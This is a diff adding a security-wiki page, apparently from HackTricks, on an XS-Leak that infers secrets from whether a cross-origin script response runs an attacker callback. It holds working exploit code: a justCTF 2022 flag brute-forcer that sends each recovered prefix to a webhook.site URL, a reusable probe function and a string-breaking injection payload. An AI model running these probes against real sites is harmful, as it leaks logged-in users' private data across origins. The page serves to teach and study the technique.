@@ -1,0 +1,248 @@
+# JavaScript Execution XS Leak
+
+{{#include ../../banners/hacktricks-training.md}}
+
+This XS-Search primitive turns **whether a cross-origin response executes as JavaScript** into a **Boolean oracle**.<sup>[[1]](#references)</sup>
+
+The usual setup is:
+
+- **Positive state**: the target returns attacker-controlled text or sensitive content that does **not** execute as attacker JavaScript.
+- **Negative state**: the target reflects attacker-controlled text into a place that is parsed as valid JavaScript, so the attacker can force a callback such as `window.parent.foo()`.
+- **Leak**: load the target with a classic `<script src>` and observe whether the callback fires.
+
+This is basically an **execution oracle**, not a timing oracle. The only thing the attacker needs is a **cross-origin script inclusion** that behaves differently depending on the secret-dependent branch.
+
+For the generic XS-Leaks background, see:
+
+{{#ref}}
+README.md
+{{#endref}}
+
+## When This Works
+
+This technique is practical when all of the following are true:
+
+- The victim is authenticated to the target origin.
+- The attacker can make the victim browser request a **classic script** from the target origin.
+- One branch returns content that is **valid attacker-controlled JavaScript**.
+- The other branch returns content that **does not execute the attacker callback**.
+
+In practice, the easiest cases are search/debug endpoints that:
+
+- return attacker-controlled text when a guess is wrong
+- return a different body when the guess is right
+- let the attacker choose a parameter such as `callback`, `hint`, `msg`, or a reflected prefix/suffix
+
+## Basic Example
+
+Server-side code that will try `${guess}` as a flag prefix:
+
+```javascript
+app.get("/guessing", function (req, res) {
+  let guess = req.query.guess
+  let page = `<html>
+                <head>
+                    <script>
+                            function foo() {
+                                // If not the flag this will be executed
+                                window.parent.foo()
+                            }
+                        </script>
+                    <script src="https://axol.space/search?query=${guess}&hint=foo()"></script>
+                </head>
+                <p>hello2</p>
+                </html>`
+  res.send(page)
+})
+```
+
+Main page that generates iframes to the previous `/guessing` page to test each possibility:
+
+```html
+<html>
+  <head>
+    <script>
+      let candidateIsGood = false
+      let candidate = ""
+      let flag = "bi0sctf{"
+      let guessIndex = -1
+
+      let flagChars =
+        "_0123456789abcdefghijklmnopqrstuvwxyz}ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+
+      // this will get called from our iframe IF the candidate is WRONG
+      function foo() {
+        candidateIsGood = false
+      }
+
+      timerId = setInterval(() => {
+        if (candidateIsGood) {
+          flag = candidate
+          guessIndex = -1
+          fetch("https://webhook.site/<yours-goes-here>?flag=" + flag)
+        }
+
+        // Start with true and change to false if the guess is wrong
+        candidateIsGood = true
+        guessIndex++
+        if (guessIndex >= flagChars.length) {
+          fetch("https://webhook.site/<yours-goes-here>")
+          return
+        }
+        let guess = flagChars[guessIndex]
+        candidate = flag + guess
+        let iframe = `<iframe src="/guessing?guess=${encodeURIComponent(
+          candidate
+        )}"></iframe>`
+        hack.innerHTML = iframe
+      }, 500)
+    </script>
+  </head>
+  <p>hello</p>
+  <div id="hack"></div>
+</html>
+```
+
+The attacker logic is:<sup>[[2]](#references)</sup>
+
+1. Start every candidate as "good".
+2. Load the target response as a script.
+3. If the response executes `window.parent.foo()`, mark the candidate as wrong.
+4. If no callback fires, keep the candidate and continue brute-forcing.
+
+## Minimal Probe Pattern
+
+In many real targets, an iframe is not required. A direct script inclusion is enough:<sup>[[1]](#references)</sup>
+
+```html
+<script>
+  let hit = true
+  function miss() {
+    hit = false
+  }
+
+  function probe(url) {
+    return new Promise((resolve) => {
+      hit = true
+      const s = document.createElement("script")
+      s.src = url
+      s.onload = () => resolve(hit)
+      s.onerror = () => resolve(false)
+      document.head.appendChild(s)
+    })
+  }
+</script>
+```
+
+If the "wrong guess" branch reflects `miss()`, then:
+
+- `probe(...) === false` means the callback executed or the load failed
+- `probe(...) === true` means the script loaded without running the attacker callback
+
+For reliability, use a **fresh script element per probe** and add a **cache-buster** such as `?r=${crypto.randomUUID()}`.
+
+## Modern Caveats
+
+### It must be a classic script
+
+This primitive relies on the browser fetching the resource as a **classic script**. A plain `<script src=...>` without `crossorigin` is fetched in `no-cors` mode, which is exactly why this old pattern is still useful cross-origin.
+
+Do **not** switch to `type="module"` for this technique:
+
+- cross-origin **module scripts require CORS**
+- many targets that are includable as classic scripts will simply fail as modules
+
+### MIME type and `nosniff` decide whether the payload executes
+
+Current browsers are stricter than older writeups. If the target sets `X-Content-Type-Options: nosniff`, the browser will block a script response whose MIME type is not a JavaScript MIME type.
+
+That means this oracle often depends on:
+
+- whether the target returns `application/javascript` / `text/javascript`
+- whether the target returns `text/plain`, `text/html`, or JSON
+- whether `nosniff` is present
+
+This is also why some endpoints only give a leak in one branch: one response is accepted as script, while the other branch is blocked or parsed differently.
+
+### CORB can change the observable result
+
+CORB adds another branch to think about. If a response is considered CORB-protected, Chromium may turn it into an **empty valid script response** instead of surfacing a parse failure. So for some endpoints:
+
+- one state triggers a normal script parse / callback
+- another state becomes an empty script and only `onload` fires
+
+That is still a useful oracle, but the signal is now **callback vs no callback** or **onload vs onerror**, not just "JavaScript executed or not".
+
+### CSP can kill the attacker-controlled branch
+
+Strict CSP on the **target response** can break this primitive when the reflected branch is no longer executable JavaScript. Public XS-Leak challenge writeups from 2022 to 2024 repeatedly rely on this detail:
+
+- `script-src 'none'` can force attackers to pivot away from a direct execution oracle
+- CSP/SRI/CSP-report interactions can still create **other** leak oracles, but those belong to different pages/techniques
+
+So when the obvious callback trick does not work, inspect response headers before discarding the endpoint.
+
+## Useful Variants
+
+### Callback-parameter endpoints
+
+The most convenient target is a JSONP-style or debug endpoint that accepts a parameter such as:
+
+- `callback=...`
+- `cb=...`
+- `jsonp=...`
+- `hint=...`
+- `msg=...`
+
+If the "miss" branch reflects that value verbatim into executable JavaScript while the "hit" branch returns different content, you get a direct Boolean oracle with no timing measurement.
+
+### Syntax-preserving prefixes and suffixes
+
+Sometimes you cannot fully control the response body, but you can still make the negative branch execute:
+
+- close the current string or function argument
+- inject the callback
+- comment out the trailing bytes
+
+For example, a reflected branch like:
+
+```javascript
+showResult("<attacker>");
+```
+
+can often be turned into:
+
+```javascript
+showResult("");window.parent.foo();//");
+```
+
+If the positive branch does not reflect that payload, the callback becomes the oracle.
+
+### Combining with event-based oracles
+
+If the endpoint is unstable across browsers, mix the execution oracle with the generic script load events already covered in the section index:<sup>[[1]](#references)</sup>
+
+- callback fired
+- `onload`
+- `onerror`
+
+This is especially useful when one branch yields valid JavaScript and another branch yields blocked MIME / CORB / CSP behavior.
+
+Related pages:
+
+- [Cookie Bomb + Onerror XS Leak](cookie-bomb-+-onerror-xs-leak.md)
+- [performance.now example](performance.now-example.md)
+
+## Practical Notes
+
+- Prefer **one bit per request** and keep the callback side effect simple.
+- If you probe many candidates, remove previously inserted `<script>` elements or isolate each attempt in a fresh iframe.
+- Cache and service worker behavior can poison the oracle; use cache-busting.
+- This primitive is strongest when the negative branch is **fully attacker-controlled JavaScript**. If you only get partial reflection, the exploit becomes a payload-shaping problem rather than an XS-Search problem.
+
+## References
+
+- [1] [XS-Leaks Wiki: Error Events](https://xsleaks.dev/docs/attacks/error-events/)
+- [2] [justCTF 2022 XS-Leak Writeup](https://blog.huli.tw/2022/06/14/en/justctf-2022-xsleak-writeup/)
+
+{{#include ../../banners/hacktricks-training.md}}
